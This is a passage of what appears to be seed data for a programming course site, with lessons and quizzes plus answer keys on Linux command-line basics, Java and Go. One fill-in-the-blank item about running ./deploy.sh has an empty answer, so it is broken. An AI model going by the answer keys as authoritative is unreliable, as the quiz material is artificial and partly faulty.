      `A Linux filesystem is organized as a single tree, starting from one root directory, \`/\`, with everything else nested underneath it, unlike Windows there's no separate "C:" drive.\n\n\`\`\`\n/\n├── home/\n│   └── ada/       # your personal files usually live here\n├── etc/            # system configuration files\n├── usr/            # installed programs\n└── tmp/            # temporary files, cleared periodically\n\`\`\`\n\n## Navigating\n\n\`\`\`bash\ncd /home/ada       # change directory (absolute path, starts with /)\ncd Documents       # relative path, relative to where you already are\ncd ..              # go up one level\ncd ~               # jump to your home directory\nls -la             # list files, including hidden ones (-a) with details (-l)\n\`\`\`\n\nAn **absolute path** always starts from \`/\` and works no matter where you currently are. A **relative path** is interpreted starting from your current directory, so \`cd Documents\` only works if \`Documents\` exists right where you're standing.\n\n## Managing files\n\n\`\`\`bash\nmkdir projects           # create a directory\ntouch notes.txt          # create an empty file\ncp notes.txt backup.txt  # copy\nmv notes.txt todo.txt    # rename/move\nrm backup.txt            # delete a file\nrm -r old_folder         # delete a directory and everything in it (recursive)\n\`\`\`\n\n> [!WARNING]\n> \`rm\` does **not** move files to a trash bin, it deletes them immediately and permanently. \`rm -r\` on the wrong directory is one of the most common ways people lose real work, always double-check the path before you hit enter.`
    ),
    quiz: {
      title: 'Filesystems Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does a relative path like "Documents" (without a leading /) depend on?',
          options: ['Your username', 'Your current working directory', 'The system clock', 'Nothing, it always resolves the same way'],
          answer: 'Your current working directory',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Files deleted with rm on Linux are moved to a recoverable trash/recycle bin by default.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The command to create a new, empty directory is: ____ <name>',
          options: [],
          answer: 'mkdir',
        },
      ],
    },
  },
  {
    title: 'Programs',
    content: lessonContent(
      'Programs',
      `Running a program from the command line is more nuanced than it looks, the shell has to first figure out **where** the program you typed actually lives.\n\n## PATH\n\nWhen you type \`ls\`, the shell doesn't magically know where the \`ls\` program is, it searches a list of directories stored in an environment variable called \`PATH\`:\n\n\`\`\`bash\necho $PATH\n# /usr/local/bin:/usr/bin:/bin\n\nwhich ls\n# /usr/bin/ls, the first match found while searching PATH in order\n\`\`\`\n\n\`PATH\` is a colon-separated list of directories, the shell checks each one in order until it finds an executable file with that name. This is why installing a new tool sometimes requires adding its folder to \`PATH\`, otherwise typing its name does nothing but "command not found".\n\n## Running local scripts\n\nA script in your current directory is deliberately **not** found automatically, even if you're standing right next to it, this is a safety feature so a malicious file named \`ls\` sitting in a random folder can't silently hijack your commands:\n\n\`\`\`bash\n./deploy.sh     # explicit "run the file right here", the ./ is required\nbash deploy.sh  # or, explicitly hand it to the bash interpreter\n\`\`\`\n\n## Executable permission\n\nA script also needs the **executable bit** set before \`./\` will run it (more on permissions two lessons from now):\n\n\`\`\`bash\nchmod +x deploy.sh\n./deploy.sh\n\`\`\`\n\nWithout \`chmod +x\`, you'll get a "permission denied" error even though the file exists and is readable.`
    ),
    quiz: {
      title: 'Programs Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is PATH?',
          options: ['The current working directory', 'A colon-separated list of directories the shell searches for programs', 'A single file containing every installed program', 'A Linux permission level'],
          answer: 'A colon-separated list of directories the shell searches for programs',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A script in your current directory runs automatically just by typing its name, the same as a PATH command.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'To run a script literally sitting in your current directory, you type ____./deploy.sh',
          options: [],
          answer: '',
        },
      ],
    },
  },
  {
    title: 'Input/Output',
    content: lessonContent(
      'Input/Output',
      `Every program has three standard I/O streams: **stdin** (input), **stdout** (normal output), and **stderr** (error output). Understanding them is what unlocks the CLI's real power, connecting simple programs together to build something bigger.\n\n## Redirection\n\n\`\`\`bash\necho "hello" > out.txt     # redirect stdout, overwrites out.txt\necho "world" >> out.txt    # append instead of overwrite\nsort < names.txt            # redirect stdin FROM a file\ncat missing.txt 2> err.log  # redirect stderr (file descriptor 2) to a file\n\`\`\`\n\n\`>\` and \`>>\` both aim a program's output at a file instead of your screen, the difference is whether it replaces or adds to existing content. \`<\` does the reverse, feeding a file's contents in as if you'd typed them.\n\n## Pipes\n\nA pipe (\`|\`) connects one program's stdout directly to the next program's stdin, no temp file needed:\n\n\`\`\`bash\ncat access.log | grep "ERROR" | wc -l\n\`\`\`\n\nRead this left to right: print the log file, filter to lines containing "ERROR", count how many lines are left. Each command does one small job well, and piping chains them into something none of them could do alone, this is the core Unix philosophy.\n\n## Arguments and flags recap\n\n\`\`\`bash\ngrep -i "error" access.log   # -i = case-insensitive flag\ngrep -c "error" access.log   # -c = count matches instead of printing them\n\`\`\`\n\nMost CLI tools accept flags to change their behavior without changing what you're fundamentally asking them to do, always check \`--help\` when you need a tool to behave slightly differently than its default.`
    ),
    quiz: {
      title: 'Input/Output Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does the pipe operator (|) do?',
          options: ['Deletes both files', 'Connects one command\'s stdout to the next command\'s stdin', 'Runs two commands at the exact same instant', 'Compares two files for differences'],
          answer: "Connects one command's stdout to the next command's stdin",
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Using >> instead of > appends to a file instead of overwriting it.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The three standard I/O streams every program has are stdin, stdout, and ____.',
          options: [],
          answer: 'stderr',
        },
      ],
    },
  },
  {
    title: 'Local CLI',
    content: lessonContent(
      'Local CLI',
      `Everything so far works the same in a browser-based sandbox. Real systems work involves your own machine, so this lesson is a guided tour of what to set up locally.\n\n## A real terminal, and WSL on Windows\n\nmacOS and Linux both ship with a real terminal out of the box. On Windows, install **WSL** (Windows Subsystem for Linux), which runs a genuine Linux environment alongside Windows:\n\n\`\`\`bash\nwsl --install\n\`\`\`\n\nThis gets you a real \`bash\` shell, real Linux filesystem semantics, and every command in this course working exactly as shown, rather than an approximation.\n\n## Manual pages\n\nEvery standard command ships with a full manual, more detailed than \`--help\`:\n\n\`\`\`bash\nman ls\n# space/f = next page, b = previous page, q = quit\n\`\`\`\n\n## Interactive pagers\n\nCommands like \`man\`, and tools like \`less\`, are **pagers**, they show output one screen at a time instead of dumping it all at once:\n\n\`\`\`bash\ncat huge_log.txt | less   # scroll through with arrow keys, q to quit\n\`\`\`\n\n## Processes\n\nEvery running program is a **process**, with a unique process ID (PID):\n\n\`\`\`bash\nps aux            # list running processes\ntop                # live, updating view of processes and resource use\nkill 4821          # ask a process to stop, by PID\n\`\`\`\n\n## Users, root, and sudo\n\nLinux is multi-user by design. Regular users can't modify system files or other users' data, that requires the **root** user, the one account with unrestricted access:\n\n\`\`\`bash\nwhoami             # your current user\nsudo apt update    # run one command AS root, temporarily, with a password prompt\n\`\`\`\n\n\`sudo\` ("superuser do") is how you borrow root's power for a single command without permanently logging in as root, which is exactly the safer, auditable model almost every real system uses.\n\n> [!WARNING]\n> Running everyday commands as root "just to avoid permission errors" is a common beginner habit and a real safety risk, a typo in a root shell can damage the whole system. Use \`sudo\` per-command instead.`
    ),
    quiz: {
      title: 'Local CLI Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does WSL let you do on Windows?',
          options: ['Delete Linux permanently', 'Run a real Linux environment alongside Windows', 'Compile Windows programs faster', 'Replace the Windows terminal with cmd.exe'],
          answer: 'Run a real Linux environment alongside Windows',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'sudo permanently logs you in as the root user for the rest of your session.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The one Linux account with unrestricted access to modify any file on the system is called ____.',
          options: [],
          answer: 'root',
        },
      ],
    },
  },
  {
    title: 'Permissions',
    content: lessonContent(
      'Permissions',
      `Every file and directory on Linux has an owner, a group, and a set of permissions controlling who can read, write, or execute it.\n\n\`\`\`bash\nls -l notes.txt\n# -rw-r--r-- 1 ada staff 128 Jan 5 10:00 notes.txt\n\`\`\`\n\nThat first cryptic-looking column breaks down into four parts:\n\n\`\`\`\n-  rw-  r--  r--\n│   │    │    │\n│   │    │    └─ others: read only\n│   │    └────── group: read only\n│   └─────────── owner (ada): read and write\n└─────────────── file type (- = regular file, d = directory)\n\`\`\`\n\nEach group of three letters means **r**ead, **w**rite, **e**xecute, in that fixed order, a \`-\` means that permission is absent.\n\n## Changing permissions\n\n\`\`\`bash\nchmod +x deploy.sh       # add execute permission for everyone\nchmod u+w notes.txt      # add write, but only for the (u)ser/owner\nchmod 644 notes.txt      # numeric form: owner rw-, group r--, others r--\n\`\`\`\n\nThe numeric form adds up read (4) + write (2) + execute (1) per group: \`6\` = rw-, \`7\` = rwx, \`4\` = r--. \`644\` is an extremely common default for regular files, \`755\` for scripts and directories (execute lets you \`cd\` into a directory, not just list it).\n\n## Changing ownership\n\n\`\`\`bash\nsudo chown ada:staff notes.txt   # change owner (ada) and group (staff)\n\`\`\`\n\nChanging ownership requires root, since it's a security-sensitive operation, you can't just hand your files off to someone else's ownership without a privileged account authorizing it.`
    ),
    quiz: {
      title: 'Permissions Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'In "-rw-r--r--", what permissions does the file\'s owner have?',
          options: ['Read only', 'Read and write', 'Read, write, and execute', 'No permissions'],
          answer: 'Read and write',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'The numeric permission 644 grants the owner read+write, and group/others read-only.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The command to add execute permission to a script for everyone is: chmod ____ deploy.sh',
          options: [],
          answer: '+x',
        },
      ],
    },
  },
  {
    title: 'Editors and Packages',
    content: lessonContent(
      'Editors and Packages',
      `The last piece of a real development environment: editing files without a GUI, and installing software the Linux way.\n\n## Terminal text editors\n\nWhen you're already in a terminal (editing a config file on a remote server, for example), a terminal-based editor avoids switching context entirely:\n\n\`\`\`bash\nnano notes.txt   # beginner-friendly, shortcuts shown on screen\nvim notes.txt    # ubiquitous, steeper learning curve, worth learning eventually\n\`\`\`\n\n\`nano\` shows its keyboard shortcuts (like \`^O\` to save) right at the bottom of the screen, making it the easiest place to start. \`vim\` is nearly universal, it's preinstalled on almost every Linux server you'll ever SSH into, which is exactly why it's worth getting comfortable with over time even though \`nano\` is friendlier at first.\n\n## Package managers\n\nInstalling software on Linux almost never means downloading an installer from a website, a **package manager** fetches, installs, and keeps software up to date from a trusted repository:\n\n\`\`\`bash\n# Debian/Ubuntu\nsudo apt update && sudo apt install git\n\n# macOS\nbrew install git\n\n# Cross-platform, no admin rights required\nwebi git\n\`\`\`\n\n\`apt\` is Debian/Ubuntu's package manager, built into the OS. **Homebrew** (\`brew\`) is the de facto standard on macOS, and increasingly used on Linux too. **Webi** is a newer, simpler installer that doesn't require \`sudo\` at all, handy when you don't have admin rights on a machine.\n\n## Setting up a dev environment, end to end\n\n\`\`\`bash\nsudo apt update\nsudo apt install git python3 build-essential\ngit --version\npython3 --version\n\`\`\`\n\nThat's the complete pattern behind setting up almost any machine for development: update your package lists, install the tools you need by name, and verify each one with \`--version\`.`
    ),
    quiz: {
      title: 'Editors and Packages Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is the main advantage of installing software with a package manager instead of a website installer?',
          options: ['It is always faster to download', 'It fetches trusted, versioned software and keeps it updatable from one place', 'It never requires any configuration', 'Package managers only work offline'],
          answer: 'It fetches trusted, versioned software and keeps it updatable from one place',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'vim is preinstalled on almost every Linux server, which is part of why it is worth learning even though it has a steeper learning curve than nano.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'On Debian/Ubuntu, the command to install a package called git is: sudo apt ____ git',
          options: [],
          answer: 'install',
        },
      ],
    },
  },
];

const javaLessons: SeedLesson[] = [
  {
    title: 'Hello, Java',
    content: lessonContent(
      'Hello, Java',
      `Java is a statically-typed, object-oriented language that runs on the **JVM** (Java Virtual Machine), write once, run anywhere: the same compiled bytecode runs unmodified on any machine with a JVM installed.\n\n## Your first program\n\n\`\`\`java\npublic class Hello {\n    public static void main(String[] args) {\n        System.out.println("Hello, Kodstigen!");\n    }\n}\n\`\`\`\n\nA few things that look unfamiliar if you're coming from Python or JavaScript:\n\n- **Everything lives inside a class.** Java has no free-floating functions, \`main\` must be a method of some class.\n- \`public static void main(String[] args)\` is the fixed, required signature the JVM looks for as the entry point, \`public\` (callable from outside), \`static\` (belongs to the class itself, not an instance), \`void\` (returns nothing), \`String[] args\` (command-line arguments).\n- The **filename must match the public class name** exactly: \`Hello.java\`.\n\n## Compiling and running\n\nJava compiles to an intermediate form called **bytecode**, not directly to native machine code:\n\n\`\`\`bash\njavac Hello.java   # compiles Hello.java into Hello.class (bytecode)\njava Hello          # the JVM runs the bytecode\n\`\`\`\n\nThis two-step process, and the JVM in between, is exactly what makes "write once, run anywhere" true, the same \`.class\` file runs on Windows, macOS, or Linux without recompiling, as long as a JVM is installed.\n\n> [!TIP]\n> \`System.out.println\` is verbose on purpose, it's read as "the \`out\` stream on the \`System\` class, call \`println\`", once you know Java always nests functionality inside classes, the verbosity stops feeling arbitrary.`
    ),
    quiz: {
      title: 'Hello, Java Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does the JVM actually execute?',
          options: ['Raw Java source code', 'Compiled bytecode', 'Native machine code compiled per-OS', 'Python bytecode'],
          answer: 'Compiled bytecode',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'In Java, a function can exist on its own, outside of any class.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The command that compiles Hello.java into bytecode is: ____ Hello.java',
          options: [],
          answer: 'javac',
        },
      ],
    },
  },
  {
    title: 'Variables and Types',
    content: lessonContent(
      'Variables and Types',
      `Java has two fundamentally different kinds of types: **primitives**, and **objects**. Mixing them up is one of the most common early confusions.\n\n## Primitives\n\n\`\`\`java\nint xp = 0;\ndouble ratio = 0.5;\nboolean loggedIn = true;\nchar grade = 'A';\nxp += 10;\n\`\`\`\n\nPrimitives store their value directly, are fixed-size, and are **not** objects, they have no methods, can't be \`null\`, and are always passed by value.\n\n## Objects\n\nEverything else, starting with \`String\`, is an object, a reference to data living on the heap:\n\n\`\`\`java\nString name = "Ada";\nInteger boxedXp = 10;    // the "boxed" object version of int\nname = null;              // objects CAN be null, primitives cannot\n\`\`\`\n\n\`String\` looks like a primitive in everyday use (you can write \`"hello"\` directly), but it's really an object under the hood, with methods like \`.length()\` and \`.toUpperCase()\`.\n\n## Type inference with var\n\nModern Java lets the compiler infer a local variable's type from its initializer:\n\n\`\`\`java\nvar count = 5;          // inferred as int\nvar name = "Ada";        // inferred as String\n\`\`\`\n\n\`var\` is purely a compile-time convenience, Java is still 100% statically typed underneath, \`count\` is genuinely an \`int\` forever, the compiler just saved you from typing it twice.\n\n| | Primitive | Object |\n|---|---|---|\n| Examples | int, double, boolean, char | String, Integer, any class |\n| Can be null | No | Yes |\n| Has methods | No | Yes |\n| Stored | Directly, on the stack | Reference to the heap |`
    ),
    quiz: {
      title: 'Variables and Types Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which of these can be set to null?',
          options: ['int', 'boolean', 'String', 'char'],
          answer: 'String',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Using var still means the variable is statically typed, the compiler just infers the type instead of you writing it.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A type like int or boolean that stores its value directly and is never null is called a ____.',
          options: [],
          answer: 'primitive',
        },
      ],
    },
  },
  {
    title: 'Control Flow and Loops',
    content: lessonContent(
      'Control Flow and Loops',
      `Java's control flow will look familiar if you know C-family syntax, curly braces mark blocks, conditions need parentheses.\n\n\`\`\`java\nint xp = 45;\n\nif (xp >= 100) {\n    System.out.println("Level up!");\n} else if (xp >= 50) {\n    System.out.println("Almost there");\n} else {\n    System.out.println("Keep going");\n}\n\`\`\`\n\n## Loops\n\n\`\`\`java\nfor (int i = 0; i < 5; i++) {\n    System.out.println("Iteration " + i);\n}\n\nint[] scores = {90, 85, 77};\nfor (int score : scores) {   // "enhanced for", like Python's for-in\n    System.out.println(score);\n}\n\nint tries = 0;\nwhile (tries < 3) {\n    tries++;\n}\n\`\`\`\n\nThe enhanced \`for (int score : scores)\` form reads as "for each \`score\` in \`scores\`", it's the idiomatic way to iterate when you don't need the index.\n\n## Switch expressions\n\nModern Java's \`switch\` can be used as an **expression** that directly produces a value, not just a statement that runs code:\n\n\`\`\`java\nString tier = switch (xp / 25) {\n    case 0 -> "Bronze";\n    case 1 -> "Silver";\n    case 2 -> "Gold";\n    default -> "Platinum";\n};\n\`\`\`\n\nEach \`case\` uses \`->\` instead of \`:\`, which means no accidental "fallthrough" to the next case, a common bug in older-style \`switch\` statements, and the whole thing evaluates directly to \`tier\`.`
    ),
    quiz: {
      title: 'Control Flow Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does "for (int score : scores)" mean?',
          options: ['Loop while score equals scores', 'Iterate over each element in the scores array', 'Declare a new array called scores', 'Compare score to scores'],
          answer: 'Iterate over each element in the scores array',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A modern switch expression using -> can directly produce a value assigned to a variable.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The loop that keeps running as long as a condition stays true, checked before each iteration, is a ____ loop.',
          options: [],
          answer: 'while',
        },
      ],
    },
  },
  {
    title: 'Methods and Classes',
    content: lessonContent(
      'Methods and Classes',
      `A **class** is a blueprint for objects, bundling data (**fields**) and behavior (**methods**) together, the foundation of Java's object-oriented style.\n\n\`\`\`java\npublic class Student {\n    private String name;\n    private int xp;\n\n    public Student(String name) {   // constructor\n        this.name = name;\n        this.xp = 0;\n    }\n\n    public void gainXp(int amount) {\n        this.xp += amount;\n    }\n\n    public int getXp() {\n        return this.xp;\n    }\n}\n\`\`\`\n\n\`\`\`java\nStudent ada = new Student("Ada");\nada.gainXp(50);\nSystem.out.println(ada.getXp()); // 50\n\`\`\`\n\n- The **constructor** (same name as the class, no return type) runs whenever you \`new\` an instance, setting up its initial state.\n- \`this\` refers to the specific instance a method was called on, needed here because the parameter \`name\` shadows the field \`name\`.\n- \`private\` fields can only be accessed from inside the class itself, forcing outside code to go through methods like \`gainXp\`/\`getXp\` instead of reaching in and mutating state directly, this is **encapsulation**.\n\n## Why private fields plus public methods?\n\n\`getXp()\`/\`gainXp()\` exist instead of a public \`xp\` field so the class controls *how* its state changes, e.g. \`gainXp\` could reject negative amounts, or trigger a level-up check, logic a bare public field could never enforce. This getter/setter pattern is one of the most common in all of Java.`
    ),
    quiz: {
      title: 'Methods and Classes Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What runs automatically when you create a new instance with "new Student(...)"?',
          options: ['The getXp method', 'The constructor', 'The main method', 'Nothing runs automatically'],
          answer: 'The constructor',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A private field can be accessed directly from outside the class it is declared in.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Keeping fields private and only exposing controlled access through methods is called ____.',
          options: [],
          answer: 'encapsulation',
        },
      ],
    },
  },
  {
    title: 'Collections and Generics',
    content: lessonContent(
      'Collections and Generics',
      `Java's **Collections Framework** provides ready-made, reusable data structures, and **generics** let those structures stay type-safe no matter what they hold.\n\n\`\`\`java\nimport java.util.ArrayList;\nimport java.util.List;\n\nList<String> languages = new ArrayList<>();\nlanguages.add("Java");\nlanguages.add("Go");\nSystem.out.println(languages.get(0)); // "Java"\n\nfor (String lang : languages) {\n    System.out.println(lang.toUpperCase());\n}\n\`\`\`\n\n\`List<String>\` is a **generic type**, the \`<String>\` tells the compiler "this list only ever holds \`String\`s", so trying to \`.add(42)\` is a compile error, not a runtime surprise. \`ArrayList\` is the most common concrete implementation, a resizable, array-backed list.\n\n## Maps\n\n\`\`\`java\nimport java.util.HashMap;\nimport java.util.Map;\n\nMap<String, Integer> scores = new HashMap<>();\nscores.put("Ada", 95);\nscores.put("Grace", 98);\n\nSystem.out.println(scores.get("Ada")); // 95\nSystem.out.println(scores.getOrDefault("Bob", 0)); // 0, key doesn't exist\n\`\`\`\n\n\`Map<String, Integer>\` associates keys with values, like Python's dict. \`getOrDefault\` avoids a \`null\` result (and a potential \`NullPointerException\`) when a key might not exist.\n\n## Why generics matter\n\nWithout generics, a collection could only hold \`Object\`, meaning you'd have to cast every single item back to its real type before using it, and the compiler couldn't catch a mistake until it crashed at runtime. Generics push that type checking to compile time, exactly where you want to catch bugs.`
    ),
    quiz: {
      title: 'Collections and Generics Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does the <String> in List<String> guarantee?',
          options: ['The list can never be empty', 'The list only ever holds String values, checked at compile time', 'The list is automatically sorted', 'Nothing, it is just documentation'],
          answer: 'The list only ever holds String values, checked at compile time',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Map.getOrDefault avoids returning null when a key does not exist in the map.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The most common resizable, array-backed implementation of List in Java is called ____.',
          options: [],
          answer: 'ArrayList',
        },
      ],
    },
  },
  {
    title: 'Interfaces and Inheritance',
    content: lessonContent(
      'Interfaces and Inheritance',
      `Java supports two ways to share behavior across classes: **inheritance** (extending a class) and **interfaces** (implementing a contract). Knowing when to reach for each is core to writing idiomatic Java.\n\n## Inheritance\n\n\`\`\`java\npublic class Animal {\n    protected String name;\n    public Animal(String name) { this.name = name; }\n    public String speak() { return name + " makes a sound"; }\n}\n\npublic class Dog extends Animal {\n    public Dog(String name) { super(name); } // call the parent constructor\n\n    @Override\n    public String speak() {\n        return name + " barks";\n    }\n}\n\`\`\`\n\n\`Dog extends Animal\` inherits its fields and methods, then **overrides** \`speak()\` with its own version. \`super(name)\` calls \`Animal\`'s constructor, since \`Dog\` doesn't own the \`name\` field itself, it inherited it.\n\n## Interfaces\n\nAn interface declares **what** a class must do, without saying **how**:\n\n\`\`\`java\npublic interface Comparable2<T> {\n    int compareTo(T other);\n}\n\npublic class Student implements Comparable2<Student> {\n    int xp;\n    public int compareTo(Student other) {\n        return this.xp - other.xp;\n    }\n}\n\`\`\`\n\nA class can \`implements\` as many interfaces as it wants, but can only \`extends\` **one** class, this is a deliberate Java design decision to avoid the ambiguity of multiple inheritance ("if two parent classes both define \`speak()\` differently, which one wins?").\n\n## Why prefer interfaces?\n\nCode written against an interface (\`List<String>\` instead of \`ArrayList<String>\`) doesn't care which concrete implementation it's handed, \`ArrayList\`, \`LinkedList\`, anything, as long as it implements \`List\`. This is called **programming to an interface**, and it's one of the most valuable habits in all of object-oriented design.`
    ),
    quiz: {
      title: 'Interfaces and Inheritance Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'How many classes can a single Java class extend?',
          options: ['Zero', 'Exactly one', 'As many as needed', 'Unlimited, same as interfaces'],
          answer: 'Exactly one',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A class can implement multiple interfaces at the same time.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The call super(name) inside a subclass constructor invokes the ____ class\'s constructor.',
          options: [],
          answer: 'parent',
        },
      ],
    },
  },
  {
    title: 'Final Project: Library Management Console App',
    content: lessonContent(
      'Final Project: Library Management Console App',
      `Combine everything from this course into a small, real console application: a library management system.\n\n## Requirements\n\n1. Create a \`Book\` class with fields for title, author, and a checked-out boolean, plus a constructor and getter methods.\n2. Create a \`Library\` class holding a \`List<Book>\`, with methods \`addBook(Book b)\`, \`checkOut(String title)\`, \`returnBook(String title)\`, and \`listAvailable()\`.\n3. Use a \`Map<String, Book>\` (keyed by title) internally if you'd like faster lookups than scanning the list, either approach is fine.\n4. \`main\` should add at least 3 books, check one out, attempt to check out an already-checked-out book (and print a clear message instead of crashing), then list what's still available.\n5. Define at least one interface (e.g. \`Searchable\` with a \`search(String query)\` method) and implement it on \`Library\`.\n\n## Stretch goals\n\n- Add a \`Member\` class and track which member currently has each book checked out.\n- Support returning a book by member name instead of just by title.\n- Sort the available books alphabetically before printing them.\n\nSubmit a link to your finished project below, an instructor will review it before you can mark this lesson complete. Good luck!`
    ),
    requiresSubmission: true,
  },
];

const goLessons: SeedLesson[] = [
  {
    title: 'Hello, Go',
    content: lessonContent(
      'Hello, Go',
      `Go (often called Golang) was built at Google to be simple, fast to compile, and easy to run at scale, it deliberately has a small feature set compared to languages like C++ or Java, that's a design goal, not a limitation.\n\n## Your first program\n\n\`\`\`go\npackage main\n\nimport "fmt"\n\nfunc main() {\n    fmt.Println("Hello, Kodstigen!")\n}\n\`\`\`\n\n- Every Go file belongs to a **package**, \`package main\` marks this one as an executable program's entry point (as opposed to a reusable library package).\n- \`import "fmt"\` brings in the formatting/printing package, Go's standard library is organized into small, focused packages like this.\n- \`func main()\` is where execution starts, no class wrapper needed, unlike Java.\n\n## Compiling and running\n\n\`\`\`bash\ngo run main.go     # compile and run in one step, good for development\ngo build main.go   # produce a standalone binary called main (or main.exe)\n./main\n\`\`\`\n\nGo compiles to a **single, statically-linked binary** with no external runtime required, you can copy that one file to another machine and run it, nothing else needs to be installed.\n\n> [!TIP]\n> Go ships an opinionated formatter, \`gofmt\`, and the community treats consistent formatting as non-negotiable. Run \`gofmt -w main.go\` and never argue about tabs vs. spaces again.`
    ),
    quiz: {
      title: 'Hello, Go Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does "go build" produce?',
          options: ['A bytecode file requiring a separate runtime', 'A standalone, statically-linked binary', 'A JavaScript file', 'Nothing, it only checks for errors'],
          answer: 'A standalone, statically-linked binary',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Go requires main to be defined inside a class, similar to Java.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The command that compiles and runs a Go file in a single step is: go ____ main.go',
          options: [],
          answer: 'run',
        },
      ],
    },
  },
  {
    title: 'Variables, Types and Constants',
    content: lessonContent(
      'Variables, Types and Constants',
      `Go is statically typed, but leans hard on type inference so you rarely have to spell types out.\n\n\`\`\`go\nvar xp int = 0        // explicit type\nvar name = "Ada"       // inferred as string\ncount := 5              // short declaration, inferred, only works inside functions\nxp += 10\n\`\`\`\n\n\`:=\` is the idiomatic way to declare and initialize a variable at the same time inside a function, Go infers the type from the right-hand side. \`var\` is used instead when you need to declare without initializing, or at the package level (outside any function), where \`:=\` isn't allowed.\n\n## Zero values\n\nUnlike many languages, an uninitialized Go variable is never garbage or \`undefined\`, it gets a sensible **zero value** automatically:\n\n\`\`\`go\nvar count int      // 0\nvar name string     // "" (empty string)\nvar ready bool      // false\n\`\`\`\n\nThis eliminates an entire category of "uninitialized variable" bugs common in other languages.\n\n## Constants\n\n\`\`\`go\nconst MaxRetries = 3\nconst Pi = 3.14159\n\`\`\`\n\n\`const\` values are fixed at compile time and can never be reassigned, use them for values that should never change during a program's execution, like configuration limits.`
    ),
    quiz: {
      title: 'Variables and Constants Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is the zero value of an uninitialized Go int?',
          options: ['null', 'undefined', '0', 'It is a compile error'],
          answer: '0',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'The := short declaration operator can be used at the package level, outside any function.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A value declared with ____ is fixed at compile time and can never be reassigned.',
          options: [],
          answer: 'const',
        },
      ],
    },
  },
  {
    title: 'Control Flow',
    content: lessonContent(
      'Control Flow',
      `Go strips control flow down to the essentials, there's no \`while\`, no ternary operator, and \`if\` never needs parentheses around its condition.\n\n\`\`\`go\nxp := 45\n\nif xp >= 100 {\n    fmt.Println("Level up!")\n} else if xp >= 50 {\n    fmt.Println("Almost there")\n} else {\n    fmt.Println("Keep going")\n}\n\`\`\`\n\n## for is Go's only loop\n\nGo has exactly one looping keyword, \`for\`, used in several shapes:\n\n\`\`\`go\nfor i := 0; i < 5; i++ {   // classic three-part form\n    fmt.Println(i)\n}\n\ncount := 0\nfor count < 3 {              // this IS Go's while loop\n    count++\n}\n\nfor {                         // infinite loop, until an explicit break\n    break\n}\n\nscores := []int{90, 85, 77}\nfor i, score := range scores { // like Python's enumerate\n    fmt.Println(i, score)\n}\n\`\`\`\n\n\`range\` gives you both the index and value on each iteration, if you only need the value, discard the index with \`_\`: \`for _, score := range scores\`.\n\n## switch\n\n\`\`\`go\nswitch {\ncase xp >= 100:\n    fmt.Println("Gold")\ncase xp >= 50:\n    fmt.Println("Silver")\ndefault:\n    fmt.Println("Bronze")\n}\n\`\`\`\n\nUnlike C or Java, a Go \`switch\` case does **not** fall through to the next one automatically, each case breaks on its own by default, removing a very common source of bugs.`
    ),
    quiz: {
      title: 'Control Flow Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which keyword is used for every kind of loop in Go, including a "while"-style loop?',
